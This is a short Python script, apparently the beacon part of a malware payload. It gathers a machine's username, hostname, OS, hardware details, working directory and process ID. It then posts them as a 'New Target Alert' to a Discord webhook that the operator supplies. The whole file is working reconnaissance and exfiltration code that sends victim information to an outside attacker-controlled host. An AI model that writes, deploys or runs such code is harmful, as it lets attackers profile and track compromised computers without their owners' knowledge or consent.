import time
import os
import pathlib
import socket
import threading
import argparse
import requests
import platform
import getpass

_working_path = pathlib.Path.cwd()
_payload_path = pathlib.Path(__file__).resolve()
_username = getpass.getuser() or os.environ.get("USER") or os.environ.get("USERNAME")
_computer_name = platform.node()
_os_system = platform.system()
_os_release = platform.release()
_os_version = platform.version()
_architecture = platform.machine()
_processor = platform.processor()
_cpu_count = os.cpu_count()
_current_directory = os.getcwd()
_home_directory = os.path.expanduser("~")
_process_id = os.getpid()

_webhook_lines = [
    "[!] **New Target Alert**",
    f"[!] **User:** `{_username}`",
    f"[!] **Computer:** `{_computer_name}`",
    f"[!] **OS:** `{_os_system} {_os_release} ({_os_version})`",
    f"[!] **Architecture:** `{_architecture}`",
    f"[!] **Processor:** `{_processor}`",
    f"[!] **CPU Cores:** `{_cpu_count}`",
    f"[!] **Working Directory:** `{_current_directory}`",
    f"[!] **Process ID:** `{_process_id}`"
]
_webhook_content = "\n".join(_webhook_lines)

ap = argparse.ArgumentParser()
ap.add_argument('--webhook', required=True, help="Discord Webhook URL")
args = ap.parse_args()

try:
    response = requests.post(args.webhook, json={'content': _webhook_content})
    response.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"[!] Failed to send webhook: {e}")
